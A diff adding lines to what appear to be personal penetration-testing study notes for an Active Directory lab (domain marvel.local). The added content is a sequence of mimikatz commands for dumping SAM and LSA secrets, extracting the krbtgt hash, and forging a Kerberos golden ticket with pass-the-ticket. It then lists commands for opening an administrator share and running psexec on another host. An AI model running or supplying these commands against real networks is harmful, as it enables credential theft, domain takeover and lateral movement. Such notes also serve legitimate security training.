@@ -180,5 +180,26 @@ sekurlsa::logonpasswords
 
 turn on wdigest with mimikatz
 
+lsadump::sam
 
+lsadump::lsa /patch
+crack NTLM hashes
 
+GOLDEN TICKET ATTACK
+
+lsadump::lsa /inject /name:krbtgt
+
+get S-1-5 of domain (copy)
+get NTLM hash
+
+kerberos::golden /User:Administrator/ domain:marvel.local /sid: S-1-5 ..... /krbtgt:(NTLMhash) /id:500 /ptt (pass the ticket)
+
+misc::cmd 
+
+abre cmd
+
+dir \\THEPUNISHER2\c$
+
+access network computers
+
+also: psexec.exe \\THEPUNISHER2 cmd.exe ****
